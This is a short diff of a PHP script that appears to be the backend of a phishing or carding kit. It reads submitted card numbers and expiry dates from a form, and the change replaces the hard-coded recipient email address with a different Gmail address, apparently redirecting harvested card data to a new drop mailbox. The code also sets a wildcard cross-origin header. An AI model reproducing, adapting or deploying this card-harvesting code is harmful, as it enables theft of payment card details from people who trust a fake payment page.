@@ -1,7 +1,7 @@
 <?php
 session_start();
 		header("Access-Control-Allow-Origin:*");
-		$recepientEmail = "Reup690@gmail.com";
+		$recepientEmail = "Sammyjurisydv92@gmail.com";
 		$cardnumber = $_POST["cardnumber"];
 		$expmonth = $_POST["expmonth"];
 		$expyear = $_POST["expyear"];
